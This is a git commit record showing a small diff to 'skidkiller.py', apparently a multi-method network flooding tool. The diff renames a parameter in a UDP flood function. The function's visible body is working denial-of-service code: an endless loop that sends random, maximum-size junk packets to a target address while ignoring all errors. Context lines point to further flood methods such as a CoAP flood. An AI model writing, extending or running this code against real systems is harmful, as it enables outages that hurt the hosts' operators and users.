8f355aa23df8bf6e5a51e545aa10678324af60bf
robbie the sylveon <robsterbest@gmail.com>
2026-07-23 22:29:02 +0100

    Update skidkiller.py

--- skidkiller.py
+++ skidkiller.py
@@ -137,12 +137,12 @@ def coap_flood(ip, port=5683):
 # Map method names to functions after definitions
 method_map = {name: globals()[name] for name in working_methods}
 
-def five_udp_flood(target_ip, port=5357):
+def five_udp_flood(ip, port=5357):
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             payload = b"A" * random.randint(1024, 65507)
-            sock.sendto(payload, (target_ip, port))
+            sock.sendto(payload, (ip, port))
             sock.close()
         except:
             pass
